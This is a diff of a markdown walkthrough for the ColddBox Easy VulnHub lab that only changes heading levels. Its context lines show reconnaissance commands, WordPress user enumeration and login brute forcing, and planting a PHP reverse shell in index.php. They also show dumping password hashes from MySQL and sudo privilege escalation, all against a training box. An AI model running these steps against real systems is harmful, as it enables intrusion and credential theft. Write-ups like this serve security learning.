@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/colddbox-easy,586/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.148
@@ -56,7 +54,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.15 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ nikto -h http://192.168.1.148
@@ -187,7 +185,7 @@ END_TIME: Sun Nov  8 09:04:56 2020
 DOWNLOADED: 36896 - FOUND: 13
 ```
 
-### WordPress Analysis
+## WordPress Analysis
 
 ```
 $ wpscan -e ap,at,u --url http://192.168.1.148/
@@ -296,7 +294,7 @@ Users:
 * c0ldd
 * philip
 
-### WordPress Login Brute Forcing
+## WordPress Login Brute Forcing
 
 I attempt to crack WordPress login with `wpscan` passing the users list that we found previously.
 ```
@@ -390,7 +388,7 @@ Interesting Finding(s):
 User: **c0ldd** \
 Pass: **9876543210**
 
-### Reverse Shell
+## Reverse Shell
 
 I used the PHP injection through WordPress login using the retrieved credentials.\
 I added the PHP reverse shell code content (`reverse_shell.php`) in `index.php` file.\
@@ -412,7 +410,7 @@ $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@ColddBox-Easy:/var/www/html$
 ```
 
-### DataBase Access
+## DataBase Access
 
 Searching DB credentials in WordPress configuration file
 ```
@@ -506,7 +504,7 @@ require_once(ABSPATH . 'wp-settings.php');
 DB_USER: **c0ldd** \
 DB_PASS: **cybersecurity**
 
-### MySQL Connection
+## MySQL Connection
 
 ```
 www-data@ColddBox-Easy:/$ mysql -h localhost -u c0ldd -p
@@ -545,7 +543,7 @@ MariaDB [colddbox]> SELECT user_login,user_pass FROM wp_users;
 3 rows in set (0.00 sec)
 ```
 
-### Password Cracking
+## Password Cracking
 
 Hash identification
 ```
@@ -620,7 +618,7 @@ Credentials:
 * **c0ldd** : **9876543210**
 * **hugo** : **password123456**
 
-### SSH Connection
+## SSH Connection
 
 I attempt SSH login with DB credentials while password cracking was running, and it works.
 ```
@@ -646,14 +644,14 @@ c0ldd@ColddBox-Easy:~$ id
 uid=1000(c0ldd) gid=1000(c0ldd) grupos=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
 ```
 
-### Flag #1
+## Flag #1
 
 ```
 c0ldd@ColddBox-Easy:~$ cat user.txt 
 RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 The user `c0ldd` can run `vim`, `chmod` and `ftp` as root.
 ```
@@ -694,7 +692,7 @@ root@ColddBox-Easy:/etc# id
 uid=0(root) gid=0(root) grupos=0(root)
 ```
 
-### Flag #2
+## Flag #2
 
 ```
 root@ColddBox-Easy:~# cat /root/root.txt 
